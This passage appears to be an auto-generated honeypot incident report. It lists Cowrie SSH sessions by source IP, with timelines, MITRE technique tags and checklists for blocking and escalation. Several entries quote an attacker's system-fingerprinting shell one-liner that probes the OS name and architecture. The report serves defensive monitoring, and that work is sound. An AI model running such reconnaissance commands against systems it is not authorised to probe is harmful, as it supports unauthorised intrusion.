- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b80aaa7fcdc0

| Field | Detail |
|---|---|
| **Source IP** | `122.170.111[.]140` |
| **First Seen** | 2026-07-21 03:14 |
| **Last Seen** | 2026-07-21 03:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:14:57` | `cowrie.session.connect` |
| `2026-07-21 03:14:58` | `cowrie.client.version` |
| `2026-07-21 03:14:58` | `cowrie.client.kex` |
| `2026-07-21 03:14:59` | `cowrie.login.success` |
| `2026-07-21 03:15:00` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.111[.]140` to AbuseIPDB if not already reported
- [ ] Block `122.170.111[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d29d555d67f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 03:15 |
| **Last Seen** | 2026-07-21 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:15:01` | `cowrie.session.connect` |
| `2026-07-21 03:15:01` | `cowrie.client.version` |
| `2026-07-21 03:15:01` | `cowrie.client.kex` |
| `2026-07-21 03:15:01` | `cowrie.login.success` |
| `2026-07-21 03:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cc7ba1b2d15

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 03:15 |
| **Last Seen** | 2026-07-21 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:15:01` | `cowrie.session.connect` |
| `2026-07-21 03:15:01` | `cowrie.client.version` |
| `2026-07-21 03:15:01` | `cowrie.client.kex` |
| `2026-07-21 03:15:01` | `cowrie.login.success` |
| `2026-07-21 03:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca04017f3ce

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-07-21 03:15 |
| **Last Seen** | 2026-07-21 03:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:15:06` | `cowrie.session.connect` |
| `2026-07-21 03:15:07` | `cowrie.client.version` |
| `2026-07-21 03:15:07` | `cowrie.client.kex` |
| `2026-07-21 03:15:10` | `cowrie.login.success` |
| `2026-07-21 03:15:11` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-349335732ce1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 03:15 |
| **Last Seen** | 2026-07-21 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:15:10` | `cowrie.session.connect` |
| `2026-07-21 03:15:10` | `cowrie.client.version` |
| `2026-07-21 03:15:10` | `cowrie.client.kex` |
| `2026-07-21 03:15:10` | `cowrie.login.success` |
| `2026-07-21 03:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef19f25fe39

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 03:15 |
| **Last Seen** | 2026-07-21 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:15:10` | `cowrie.session.connect` |
| `2026-07-21 03:15:10` | `cowrie.client.version` |
| `2026-07-21 03:15:10` | `cowrie.client.kex` |
| `2026-07-21 03:15:10` | `cowrie.login.success` |
| `2026-07-21 03:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c187f303424

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:15 |
| **Last Seen** | 2026-07-21 03:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:15:40` | `cowrie.session.connect` |
| `2026-07-21 03:15:41` | `cowrie.client.version` |
| `2026-07-21 03:15:41` | `cowrie.client.kex` |
| `2026-07-21 03:15:43` | `cowrie.login.success` |
| `2026-07-21 03:15:44` | `cowrie.session.params` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:44` | `cowrie.command.success` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:44` | `cowrie.command.input` |
| `2026-07-21 03:15:45` | `cowrie.log.closed` |
| `2026-07-21 03:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c5c9de96ed

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:19 |
| **Last Seen** | 2026-07-21 03:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:19:52` | `cowrie.session.connect` |
| `2026-07-21 03:19:52` | `cowrie.client.version` |
| `2026-07-21 03:19:52` | `cowrie.client.kex` |
| `2026-07-21 03:19:54` | `cowrie.login.success` |
| `2026-07-21 03:19:56` | `cowrie.session.params` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:56` | `cowrie.command.success` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:56` | `cowrie.command.input` |
| `2026-07-21 03:19:57` | `cowrie.log.closed` |
| `2026-07-21 03:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69d17c9068c2

| Field | Detail |
|---|---|
| **Source IP** | `34.78.207[.]34` |
| **First Seen** | 2026-07-21 03:20 |
| **Last Seen** | 2026-07-21 03:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:20:07` | `cowrie.session.connect` |
| `2026-07-21 03:20:07` | `cowrie.login.success` |
| `2026-07-21 03:20:08` | `cowrie.session.params` |
| `2026-07-21 03:20:08` | `cowrie.command.input` |
| `2026-07-21 03:20:08` | `cowrie.command.input` |
| `2026-07-21 03:20:08` | `cowrie.command.failed` |
| `2026-07-21 03:20:08` | `cowrie.command.input` |
| `2026-07-21 03:20:08` | `cowrie.log.closed` |
| `2026-07-21 03:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.207[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.78.207[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-869e10e7df7c

| Field | Detail |
|---|---|
| **Source IP** | `34.78.207[.]34` |
| **First Seen** | 2026-07-21 03:20 |
| **Last Seen** | 2026-07-21 03:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:20:21` | `cowrie.session.connect` |
| `2026-07-21 03:20:21` | `cowrie.login.success` |
| `2026-07-21 03:20:22` | `cowrie.session.params` |
| `2026-07-21 03:20:22` | `cowrie.command.input` |
| `2026-07-21 03:20:22` | `cowrie.command.failed` |
| `2026-07-21 03:20:31` | `cowrie.log.closed` |
| `2026-07-21 03:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.207[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.78.207[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c1c073ecc69

| Field | Detail |
|---|---|
| **Source IP** | `34.78.207[.]34` |
| **First Seen** | 2026-07-21 03:20 |
| **Last Seen** | 2026-07-21 03:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:20:23` | `cowrie.session.connect` |
| `2026-07-21 03:20:23` | `cowrie.login.success` |
| `2026-07-21 03:20:23` | `cowrie.session.params` |
| `2026-07-21 03:20:24` | `cowrie.command.input` |
| `2026-07-21 03:20:31` | `cowrie.log.closed` |
| `2026-07-21 03:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.207[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.78.207[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b933271a1a6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:21 |
| **Last Seen** | 2026-07-21 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:21:57` | `cowrie.session.connect` |
| `2026-07-21 03:21:58` | `cowrie.client.version` |
| `2026-07-21 03:21:58` | `cowrie.client.kex` |
| `2026-07-21 03:22:00` | `cowrie.login.success` |
| `2026-07-21 03:22:02` | `cowrie.session.params` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.command.success` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.command.input` |
| `2026-07-21 03:22:02` | `cowrie.log.closed` |
| `2026-07-21 03:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4df1460113e3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 03:24 |
| **Last Seen** | 2026-07-21 03:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:24:00` | `cowrie.session.connect` |
| `2026-07-21 03:24:00` | `cowrie.client.version` |
| `2026-07-21 03:24:01` | `cowrie.client.kex` |
| `2026-07-21 03:24:01` | `cowrie.login.success` |
| `2026-07-21 03:24:01` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:24:01` | `cowrie.direct-tcpip.data` |
| `2026-07-21 03:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76b9baf916b0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:24 |
| **Last Seen** | 2026-07-21 03:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:24:03` | `cowrie.session.connect` |
| `2026-07-21 03:24:04` | `cowrie.client.version` |
| `2026-07-21 03:24:04` | `cowrie.client.kex` |
| `2026-07-21 03:24:06` | `cowrie.login.success` |
| `2026-07-21 03:24:07` | `cowrie.session.params` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:07` | `cowrie.command.success` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:07` | `cowrie.command.input` |
| `2026-07-21 03:24:08` | `cowrie.log.closed` |
| `2026-07-21 03:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1056c407d19

| Field | Detail |
|---|---|
| **Source IP** | `190.223.36[.]108` |
| **First Seen** | 2026-07-21 03:25 |
| **Last Seen** | 2026-07-21 03:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:25:01` | `cowrie.session.connect` |
| `2026-07-21 03:25:01` | `cowrie.client.version` |
| `2026-07-21 03:25:01` | `cowrie.client.kex` |
| `2026-07-21 03:25:03` | `cowrie.login.success` |
| `2026-07-21 03:25:03` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.36[.]108` to AbuseIPDB if not already reported
- [ ] Block `190.223.36[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447834fa992c

| Field | Detail |
|---|---|
| **Source IP** | `24.187.213[.]29` |
| **First Seen** | 2026-07-21 03:25 |
| **Last Seen** | 2026-07-21 03:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:25:13` | `cowrie.session.connect` |
| `2026-07-21 03:25:13` | `cowrie.client.version` |
| `2026-07-21 03:25:13` | `cowrie.client.kex` |
| `2026-07-21 03:25:14` | `cowrie.login.success` |
| `2026-07-21 03:25:14` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.187.213[.]29` to AbuseIPDB if not already reported
- [ ] Block `24.187.213[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22cad6ea6c54

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:26 |
| **Last Seen** | 2026-07-21 03:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:26:11` | `cowrie.session.connect` |
| `2026-07-21 03:26:12` | `cowrie.client.version` |
| `2026-07-21 03:26:12` | `cowrie.client.kex` |
| `2026-07-21 03:26:14` | `cowrie.login.success` |
| `2026-07-21 03:26:15` | `cowrie.session.params` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:15` | `cowrie.command.success` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:15` | `cowrie.command.input` |
| `2026-07-21 03:26:16` | `cowrie.log.closed` |
| `2026-07-21 03:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2863033055e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:28 |
| **Last Seen** | 2026-07-21 03:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:28:21` | `cowrie.session.connect` |
| `2026-07-21 03:28:22` | `cowrie.client.version` |
| `2026-07-21 03:28:22` | `cowrie.client.kex` |
| `2026-07-21 03:28:24` | `cowrie.login.success` |
| `2026-07-21 03:28:25` | `cowrie.session.params` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:25` | `cowrie.command.success` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:25` | `cowrie.command.input` |
| `2026-07-21 03:28:26` | `cowrie.log.closed` |
| `2026-07-21 03:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b1b9a2b244

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:30 |
| **Last Seen** | 2026-07-21 03:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:30:30` | `cowrie.session.connect` |
| `2026-07-21 03:30:31` | `cowrie.client.version` |
| `2026-07-21 03:30:31` | `cowrie.client.kex` |
| `2026-07-21 03:30:33` | `cowrie.login.success` |
| `2026-07-21 03:30:34` | `cowrie.session.params` |
| `2026-07-21 03:30:34` | `cowrie.command.input` |
| `2026-07-21 03:30:34` | `cowrie.command.input` |
| `2026-07-21 03:30:34` | `cowrie.command.input` |
| `2026-07-21 03:30:34` | `cowrie.command.input` |
| `2026-07-21 03:30:34` | `cowrie.command.input` |
| `2026-07-21 03:30:34` | `cowrie.command.success` |
| `2026-07-21 03:30:34` | `cowrie.command.input` |
| `2026-07-21 03:30:34` | `cowrie.command.input` |
